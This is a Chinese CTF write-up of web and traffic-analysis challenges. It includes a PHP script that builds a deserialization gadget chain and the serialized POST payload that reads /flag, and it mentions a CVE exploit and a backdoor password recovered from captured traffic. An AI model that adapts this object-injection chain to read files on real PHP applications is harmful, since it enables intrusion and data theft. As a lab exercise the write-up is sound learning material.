# 青干 WP（By 翟袁一）

## Web安全

### hellogate

1. 打开网页后显示了一张图片，将图片保存到本地后用010 Editor打开，发现图片的末尾有一个PHP程序。

   ![image-20251228172444031](https://img.uettypi.top/2026/03/image-20251228172444031.png)

2. 将PHP程序提取出来后发现其为序列化，故编写脚本将其反序列化：

   ```php
   <?php  
   class A {
       public $handle;
       public function triggerMethod() {
           echo "" . $this->handle; 
       }
   }
   class B {
       public $worker;
       public $cmd;
       public function __toString() {
           return $this->worker->result;
       }
   }
   class C {
       public $cmd;
       public function __get($name) {
           echo file_get_contents($this->cmd);
       }
   }
   $a = new A;
   $b = new B;
   $c = new C;
   $a->handle = $b;
   $b->worker = $c;
   $c->cmd = "/flag";
   $ser = serialize($a);
   echo $ser;
   ?>
   ```

3. 最后构造payload为`data=O:1:"A":1:{s:6:"handle";O:1:"B":2:{s:6:"worker";O:1:"C":1:{s:3:"cmd";s:5:"/flag";}s:3:"cmd";N;}}`，POST得到flag。

   ![image-20251228173650293](https://img.uettypi.top/2026/03/image-20251228173650293.png)

### redjs

- 通过查阅资料得知此题为CVE-2025-66478的漏洞利用，故根据漏洞原理构造相应的POST请求，得到flag。

  ![image-20251228174833055](https://img.uettypi.top/2026/03/image-20251228174833055.png)

## 流量分析

### SnakeBackdoor-1

- 打开流量包，筛选HTTP，找到最后一次login事件，即得后台密码为`zxcvbnm123`。

  ![image-20251228175340288](https://img.uettypi.top/2026/03/image-20251228175340288.png)

### SnakeBackdoor-2

- 找到执行了config命令的请求，追踪HTTP流，即得SECRET_KEY。

  ![image-20251228175829222](https://img.uettypi.top/2026/03/image-20251228175829222.png)